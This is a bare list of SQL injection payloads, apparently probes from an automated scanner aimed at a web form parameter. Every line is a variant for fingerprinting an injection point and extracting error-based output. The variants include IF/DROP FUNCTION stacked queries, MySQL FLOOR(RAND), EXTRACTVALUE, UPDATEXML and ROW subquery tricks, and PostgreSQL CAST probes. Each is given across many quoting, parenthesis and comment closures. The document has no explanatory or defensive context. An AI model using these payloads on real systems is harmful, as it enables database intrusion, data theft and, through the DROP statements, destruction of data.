+1";IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1";IF(4328=2955) SELECT 4328 ELSE DROP FUNCTION WXdM--&Submit=Submit
+1%');IF(3784=9087) SELECT 3784 ELSE DROP FUNCTION RqMn--&Submit=Submit
+1%');IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1%');IF(9918=3248) SELECT 9918 ELSE DROP FUNCTION tYZR--&Submit=Submit
+1%'));IF(5047=4396) SELECT 5047 ELSE DROP FUNCTION VeMv--&Submit=Submit
+1%'));IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1%'));IF(7130=3842) SELECT 7130 ELSE DROP FUNCTION kQmK--&Submit=Submit
+1%';IF(8464=1659) SELECT 8464 ELSE DROP FUNCTION hdDX--&Submit=Submit
+1%';IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1%';IF(5037=6114) SELECT 5037 ELSE DROP FUNCTION VOvi--&Submit=Submit
+1%";IF(5640=7904) SELECT 5640 ELSE DROP FUNCTION iWSs--&Submit=Submit
+1%";IF(6147=6147) SELECT 6147 ELSE DROP FUNCTION tWIt--&Submit=Submit
+1%";IF(5314=9084) SELECT 5314 ELSE DROP FUNCTION iPqB--&Submit=Submit
+1) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nVAJ&Submit=Submit
+1) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (6191=6191&Submit=Submit
+1)) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((1141=1141&Submit=Submit
+1))) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (((2104=2104&Submit=Submit
+1 AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&Submit=Submit
+1 AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KjIi&Submit=Submit
+1 AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)# GUyS&Submit=Submit
+1' AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TLYZ&Submit=Submit
+1') AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('bESP'='bESP&Submit=Submit
+1')) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (('MIWw'='MIWw&Submit=Submit
+1'))) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((('CeqE'='CeqE&Submit=Submit
+1' AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'qQbs'='qQbs&Submit=Submit
+1') AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('UHkr' LIKE 'UHkr&Submit=Submit
+1')) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (('mzhZ' LIKE 'mzhZ&Submit=Submit
+1' AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'PdYX' LIKE 'PdYX&Submit=Submit
+1") AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ("buvw"="buvw&Submit=Submit
+1")) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (("qVlG"="qVlG&Submit=Submit
+1" AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "ERKN"="ERKN&Submit=Submit
+1") AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ("QcgK" LIKE "QcgK&Submit=Submit
+1" AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "kOLw" LIKE "kOLw&Submit=Submit
+1%') AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('%'='&Submit=Submit
+1%')) AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (('%'='&Submit=Submit
+1%' AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='&Submit=Submit
+1%" AND (SELECT 1197 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(1197=1197,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "%"="&Submit=Submit
+1) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71))-- STPm&Submit=Submit
+1) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND (5751=5751&Submit=Submit
+1)) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND ((6103=6103&Submit=Submit
+1))) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND (((6188=6188&Submit=Submit
+1 AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71))&Submit=Submit
+1 AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71))-- IUqO&Submit=Submit
+1 AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71))# OPnm&Submit=Submit
+1' AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71))-- UflC&Submit=Submit
+1') AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND ('pNtc'='pNtc&Submit=Submit
+1')) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND (('fgBA'='fgBA&Submit=Submit
+1'))) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND ((('aeDc'='aeDc&Submit=Submit
+1' AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND 'uwnT'='uwnT&Submit=Submit
+1') AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND ('zUNx' LIKE 'zUNx&Submit=Submit
+1')) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND (('FwTz' LIKE 'FwTz&Submit=Submit
+1' AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND 'Kxch' LIKE 'Kxch&Submit=Submit
+1") AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND ("QRqo"="QRqo&Submit=Submit
+1")) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND (("eorT"="eorT&Submit=Submit
+1" AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND "DrCJ"="DrCJ&Submit=Submit
+1") AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND ("NQEE" LIKE "NQEE&Submit=Submit
+1" AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND "dcrm" LIKE "dcrm&Submit=Submit
+1%') AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND ('%'='&Submit=Submit
+1%')) AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND (('%'='&Submit=Submit
+1%' AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND '%'='&Submit=Submit
+1%" AND EXTRACTVALUE(3644,CONCAT(0x5c,0x71626a7871,(SELECT (ELT(3644=3644,1))),0x7170766b71)) AND "%"="&Submit=Submit
+1) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994)-- hFap&Submit=Submit
+1) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND (3965=3965&Submit=Submit
+1)) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND ((3349=3349&Submit=Submit
+1))) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND (((9167=9167&Submit=Submit
+1 AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994)&Submit=Submit
+1 AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994)-- ATlF&Submit=Submit
+1 AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994)# cMLy&Submit=Submit
+1' AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994)-- vuxl&Submit=Submit
+1') AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND ('HnEe'='HnEe&Submit=Submit
+1')) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND (('fLxo'='fLxo&Submit=Submit
+1'))) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND ((('LBQY'='LBQY&Submit=Submit
+1' AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND 'MKdS'='MKdS&Submit=Submit
+1') AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND ('Pres' LIKE 'Pres&Submit=Submit
+1')) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND (('mELv' LIKE 'mELv&Submit=Submit
+1' AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND 'TVUv' LIKE 'TVUv&Submit=Submit
+1") AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND ("kusY"="kusY&Submit=Submit
+1")) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND (("YqOu"="YqOu&Submit=Submit
+1" AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND "uFds"="uFds&Submit=Submit
+1") AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND ("eOiS" LIKE "eOiS&Submit=Submit
+1" AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND "gXxV" LIKE "gXxV&Submit=Submit
+1%') AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND ('%'='&Submit=Submit
+1%')) AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND (('%'='&Submit=Submit
+1%' AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND '%'='&Submit=Submit
+1%" AND UPDATEXML(7116,CONCAT(0x2e,0x71626a7871,(SELECT (ELT(7116=7116,1))),0x7170766b71),8994) AND "%"="&Submit=Submit
+1) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x)-- Pgsc&Submit=Submit
+1) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND (9399=9399&Submit=Submit
+1)) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND ((5766=5766&Submit=Submit
+1))) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND (((9474=9474&Submit=Submit
+1 AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x)&Submit=Submit
+1 AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x)-- JUOB&Submit=Submit
+1 AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x)# FQCQ&Submit=Submit
+1' AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x)-- psjL&Submit=Submit
+1') AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND ('mkpW'='mkpW&Submit=Submit
+1')) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND (('Bwcs'='Bwcs&Submit=Submit
+1'))) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND ((('nsPR'='nsPR&Submit=Submit
+1' AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND 'tVRQ'='tVRQ&Submit=Submit
+1') AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND ('UmoL' LIKE 'UmoL&Submit=Submit
+1')) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND (('OiuA' LIKE 'OiuA&Submit=Submit
+1' AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND 'oKjX' LIKE 'oKjX&Submit=Submit
+1") AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND ("yjtW"="yjtW&Submit=Submit
+1")) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND (("aYLe"="aYLe&Submit=Submit
+1" AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND "YZDv"="YZDv&Submit=Submit
+1") AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND ("acTG" LIKE "acTG&Submit=Submit
+1" AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND "nNYl" LIKE "nNYl&Submit=Submit
+1%') AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND ('%'='&Submit=Submit
+1%')) AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND (('%'='&Submit=Submit
+1%' AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND '%'='&Submit=Submit
+1%" AND ROW(5438,8593)>(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(5438=5438,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM (SELECT 4750 UNION SELECT 6409 UNION SELECT 2199 UNION SELECT 8538)a GROUP BY x) AND "%"="&Submit=Submit
+1) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)-- OMug&Submit=Submit
+1) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (6226=6226&Submit=Submit
+1)) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ((3520=3520&Submit=Submit
+1))) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (((4907=4907&Submit=Submit
+1 AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)&Submit=Submit
+1 AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)-- aIOp&Submit=Submit
+1 AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)# Ncze&Submit=Submit
+1' AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)-- ltRN&Submit=Submit
+1') AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ('wSBB'='wSBB&Submit=Submit
+1')) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (('SJlv'='SJlv&Submit=Submit
+1'))) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ((('OxXd'='OxXd&Submit=Submit
+1' AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND 'pidL'='pidL&Submit=Submit
+1') AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ('iHxu' LIKE 'iHxu&Submit=Submit
+1')) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (('EMHP' LIKE 'EMHP&Submit=Submit
+1' AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND 'AMXI' LIKE 'AMXI&Submit=Submit
+1") AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ("WlXV"="WlXV&Submit=Submit
+1")) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (("UXZx"="UXZx&Submit=Submit
+1" AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND "IMqe"="IMqe&Submit=Submit
+1") AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ("bvrd" LIKE "bvrd&Submit=Submit
